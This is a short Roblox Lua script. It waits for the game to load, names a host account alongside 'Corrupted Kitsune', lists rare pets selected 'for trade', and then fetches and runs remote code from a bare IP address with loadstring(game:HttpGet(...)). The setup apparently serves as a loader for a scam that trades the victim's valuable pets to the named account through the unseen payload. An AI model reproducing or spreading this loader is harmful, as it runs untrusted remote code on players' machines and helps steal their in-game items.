repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.HostName = {
    ["SherisesSwbQz"] = "Corrupted Kitsune",
}

_G.SelectPetForTrade = {
    "Kitsune",
    "Corrupted Kitsune",
    "Dragonfly",
    "Mimic Octopus",
    "Corrupted Kodama",
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()
